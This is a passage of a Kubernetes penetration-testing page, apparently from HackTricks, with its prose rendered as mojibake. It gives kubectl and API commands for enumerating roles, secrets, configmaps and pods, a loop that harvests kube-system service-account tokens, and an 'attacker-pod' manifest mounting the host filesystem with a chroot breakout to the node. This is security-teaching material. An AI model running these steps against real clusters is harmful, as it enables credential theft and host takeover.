–Ü–Ω—à–∏–π —Å–ø–æ—Å—ñ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Å–≤–æ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó - —Ü–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\*

–í–∏ –º–æ–∂–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ **Kubernetes RBAC** –≤:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**–Ø–∫—â–æ –≤–∏ –∑–Ω–∞—î—Ç–µ, —è–∫—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó** —É –≤–∞—Å —î, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, —â–æ–± –∑'—è—Å—É–≤–∞—Ç–∏, **—á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ —ó—Ö –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏** –¥–ª—è –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó–≤:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ —Ä–æ–ª—ñ —ñ–Ω—à–∏—Ö

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ –ø—Ä–æ—Å—Ç–æ—Ä–∏ —ñ–º–µ–Ω

Kubernetes –ø—ñ–¥—Ç—Ä–∏–º—É—î **–¥–µ–∫—ñ–ª—å–∫–∞ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏—Ö –∫–ª–∞—Å—Ç–µ—Ä—ñ–≤**, —è–∫—ñ –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ –æ–¥–Ω–æ–º—É —Ñ—ñ–∑–∏—á–Ω–æ–º—É –∫–ª–∞—Å—Ç–µ—Ä—ñ. –¶—ñ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∏ –Ω–∞–∑–∏–≤–∞—é—Ç—å—Å—è **–ø—Ä–æ—Å—Ç–æ—Ä–∞–º–∏ —ñ–º–µ–Ω**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ —Å–µ–∫—Ä–µ—Ç–∏

{% tabs %}
{% tab title="kubectl" %}
```bash
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ —á–∏—Ç–∞—Ç–∏ —Å–µ–∫—Ä–µ—Ç–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Ä—è–¥–∫–∏, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ –∫–æ–∂–Ω–∏–º —Ç–æ–∫–µ–Ω–æ–º:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–ª—É–∂–±

–Ø–∫ –æ–±–≥–æ–≤–æ—Ä—é–≤–∞–ª–æ—Å—è –Ω–∞ –ø–æ—á–∞—Ç–∫—É —Ü—ñ—î—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏, **–∫–æ–ª–∏ –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è –ø–æ–¥, –∑–∞–∑–≤–∏—á–∞–π –π–æ–º—É –ø—Ä–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏**. –¢–æ–º—É, –ø–µ—Ä–µ–ª—ñ—á–∏–≤—à–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–ª—É–∂–±, —ó—Ö–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ —Ç–∞ –¥–µ –≤–æ–Ω–∏ –ø—Ä–∞—Ü—é—é—Ç—å, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø—ñ–¥–≤–∏—â–µ–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è

–†–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ **–∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏**, —è–∫—ñ –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∑–∞–ø—É—Å—Ç–∏—Ç–∏**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ Pods

Pods - —Ü–µ —Ñ–∞–∫—Ç–∏—á–Ω—ñ **–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏**, —è–∫—ñ –±—É–¥—É—Ç—å **–∑–∞–ø—É—Å–∫–∞—Ç–∏—Å—è**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ —Å–µ—Ä–≤—ñ—Å–∏

Kubernetes **—Å–µ—Ä–≤—ñ—Å–∏** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è **–µ–∫—Å–ø–æ–Ω—É–≤–∞–Ω–Ω—è —Å–µ—Ä–≤—ñ—Å—É –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –ø–æ—Ä—Ç—É —Ç–∞ IP** (—è–∫–∏–π –±—É–¥–µ –¥—ñ—è—Ç–∏ —è–∫ –±–∞–ª–∞–Ω—Å—É–≤–∞–ª—å–Ω–∏–∫ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–ª—è –ø–æ–¥—ñ–≤, —è–∫—ñ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å —Å–µ—Ä–≤—ñ—Å). –¶–µ —Ü—ñ–∫–∞–≤–æ –∑–Ω–∞—Ç–∏, –¥–µ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —ñ–Ω—à—ñ —Å–µ—Ä–≤—ñ—Å–∏, —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∞—Ç–∞–∫—É–≤–∞—Ç–∏.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ –≤—É–∑–ª–∏

–û—Ç—Ä–∏–º–∞—Ç–∏ –≤—Å—ñ **–≤—É–∑–ª–∏, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ DaemonSets

**DaeamonSets** –¥–æ–∑–≤–æ–ª—è—î –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏, —â–æ–± **–∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π pod –ø—Ä–∞—Ü—é–≤–∞–≤ –Ω–∞ –≤—Å—ñ—Ö –≤—É–∑–ª–∞—Ö** –∫–ª–∞—Å—Ç–µ—Ä–∞ (–∞–±–æ –Ω–∞ –≤–∏–±—Ä–∞–Ω–∏—Ö). –Ø–∫—â–æ –≤–∏ –≤–∏–¥–∞–ª–∏—Ç–µ DaemonSet, pods, —è–∫–∏–º–∏ –≤—ñ–Ω –∫–µ—Ä—É—î, —Ç–∞–∫–æ–∂ –±—É–¥—É—Ç—å –≤–∏–¥–∞–ª–µ–Ω—ñ.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ cronjob

Cron jobs –¥–æ–∑–≤–æ–ª—è—é—Ç—å –∑–∞–ø–ª–∞–Ω—É–≤–∞—Ç–∏ –∑–∞–ø—É—Å–∫ –ø–æ–¥—É, —è–∫–∏–π –≤–∏–∫–æ–Ω–∞—î –ø–µ–≤–Ω—É –¥—ñ—é, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å, –ø–æ–¥—ñ–±–Ω–∏–π –¥–æ crontab.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ configMap

configMap –∑–∞–≤–∂–¥–∏ –º—ñ—Å—Ç–∏—Ç—å –±–∞–≥–∞—Ç–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —Ç–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, —è–∫—ñ –Ω–∞–¥–∞—é—Ç—å—Å—è –¥–æ–¥–∞—Ç–∫–∞–º, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å —É kubernetes. –ó–∞–∑–≤–∏—á–∞–π –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±–∞–≥–∞—Ç–æ –ø–∞—Ä–æ–ª—ñ–≤, —Å–µ–∫—Ä–µ—Ç—ñ–≤, —Ç–æ–∫–µ–Ω—ñ–≤, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —Ç–∞ –≤–∞–ª—ñ–¥–∞—Ü—ñ—ó –¥–æ —ñ–Ω—à–∏—Ö –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö/–∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —Å–µ—Ä–≤—ñ—Å—ñ–≤.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ –º–µ—Ä–µ–∂–µ–≤—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ / Cilium –º–µ—Ä–µ–∂–µ–≤—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏

{% tabs %}
{% tab title="–ü–µ—Ä—à–∞ –≤–∫–ª–∞–¥–∫–∞" %}
```bash
k get networkpolicies
k get CiliumNetworkPolicies
k get CiliumClusterwideNetworkPolicies
```
{% endtab %}
{% endtabs %}

### –û—Ç—Ä–∏–º–∞—Ç–∏ –≤—Å–µ / –£—Å–µ

{% tabs %}
{% tab title="kubectl" %}
```bash
k get all
```
{% endtab %}
{% endtabs %}

### **–û—Ç—Ä–∏–º–∞—Ç–∏ –≤—Å—ñ —Ä–µ—Å—É—Ä—Å–∏, –∫–µ—Ä–æ–≤–∞–Ω—ñ helm**

{% tabs %}
{% tab title="kubectl" %}
```bash
k get all --all-namespaces -l='app.kubernetes.io/managed-by=Helm'
```
{% endtab %}
{% endtabs %}

### **–û—Ç—Ä–∏–º–∞—Ç–∏ —Å–ø–æ–∂–∏–≤–∞–Ω–Ω—è Pods**

{% tabs %}
{% tab title="kubectl" %}
```bash
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### –í–∏—Ö—ñ–¥ –∑ –ø–æ–¥–∞

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –Ω–æ–≤—ñ –ø–æ–¥–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–π—Ç–∏ –∑ –Ω–∏—Ö –Ω–∞ –≤—É–∑–æ–ª. –î–ª—è —Ü—å–æ–≥–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π –ø–æ–¥, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ–∞–π–ª yaml, –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç–∏—Å—è –Ω–∞ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –ø–æ–¥, –∞ –ø–æ—Ç—ñ–º chroot —É —Å–∏—Å—Ç–µ–º—É –≤—É–∑–ª–∞. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤–∂–µ —ñ—Å–Ω—É—é—á—ñ –ø–æ–¥–∏ —è–∫ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –¥–ª—è —Ñ–∞–π–ª—É yaml, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∏ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å —ñ—Å–Ω—É—é—á—ñ –æ–±—Ä–∞–∑–∏ —Ç–∞ —à–ª—è—Ö–∏.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> —è–∫—â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ pod –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –≤—É–∑–ª—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –º—ñ—Ç–∫–∏ –Ω–∞ –≤—É–∑–ª—ñ
>
> `k get nodes --show-labels`
>
> –ó–∞–∑–≤–∏—á–∞–π, kubernetes.io/hostname —Ç–∞ node-role.kubernetes.io/master —î —Ö–æ—Ä–æ—à–∏–º–∏ –º—ñ—Ç–∫–∞–º–∏ –¥–ª—è –≤–∏–±–æ—Ä—É.

–¢–æ–¥—ñ –≤–∏ —Å—Ç–≤–æ—Ä—é—î—Ç–µ —Å–≤—ñ–π attack.yaml —Ñ–∞–π–ª
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[original yaml source](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –≤–∏ —Å—Ç–≤–æ—Ä—é—î—Ç–µ –ø–æ–¥
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
–¢–µ–ø–µ—Ä –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç–∏—Å—è –Ω–∞ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π pod –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
–Ü –Ω–∞—Ä–µ—à—Ç—ñ –≤–∏ chroot —É —Å–∏—Å—Ç–µ–º—É –≤—É–∑–ª–∞
```bash
chroot /root /bin/bash
```
Information obtained from: [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube ‚Äì Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## References

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
